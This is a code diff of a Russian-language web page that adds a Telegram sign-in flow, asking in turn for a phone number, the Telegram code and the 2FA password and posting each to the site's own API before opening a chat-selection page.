@@ -1,14 +1,31 @@
-﻿<!DOCTYPE html>
+﻿<!doctype html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Login Part 2</title>
+    <meta charset="UTF-8" />
+    <title>Подключение Telegram</title>
     <script src="https://yastatic.net/s3/passport-sdk/autofill/v1/sdk-suggest-token-with-polyfills-latest.js"></script>
 </head>
 <body>
-<form>
-    <button type="button" onclick="">Начать конвертацию</button>
-</form>
+<h2>Вход в Telegram</h2>
+
+<div id="step-phone">
+    <label>Номер телефона:</label>
+    <input id="phone" type="tel" placeholder="+79991234567" />
+    <button onclick="sendPhone()">Отправить</button>
+</div>
+
+<div id="step-code" style="display:none;">
+    <label>Код из Telegram:</label>
+    <input id="code" type="text" />
+    <button onclick="sendCode()">Отправить</button>
+</div>
+
+<div id="step-password" style="display:none;">
+    <label>Пароль 2FA:</label>
+    <input id="password" type="password" />
+    <button onclick="sendPassword()">Отправить</button>
+</div>
+
 <script>
     window.onload = function () {
         window.YaSendSuggestToken(
@@ -17,6 +34,51 @@
                 flag: true
             }
         )
+    }
+</script>
+
+<script>
+    async function sendPhone() {
+        let phone = document.getElementById('phone').value;
+        let res = await fetch('/api/tg/start', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone })
+        });
+        if (res.ok) {
+            document.getElementById('step-phone').style.display = 'none';
+            document.getElementById('step-code').style.display = 'block';
+        }
+    }
+
+    async function sendCode() {
+        let code = document.getElementById('code').value;
+        let res = await fetch('/api/tg/code', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ code })
+        });
+        if (res.ok) {
+            let needPassword = await res.json();
+            if (needPassword.required) {
+                document.getElementById('step-code').style.display = 'none';
+                document.getElementById('step-password').style.display = 'block';
+            } else {
+                window.location.href = '/select-chat.html';
+            }
+        }
+    }
+
+    async function sendPassword() {
+        let password = document.getElementById('password').value;
+        let res = await fetch('/api/tg/password', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ password })
+        });
+        if (res.ok) {
+            window.location.href = '/select-chat.html';
+        }
     }
 </script>
 </body>
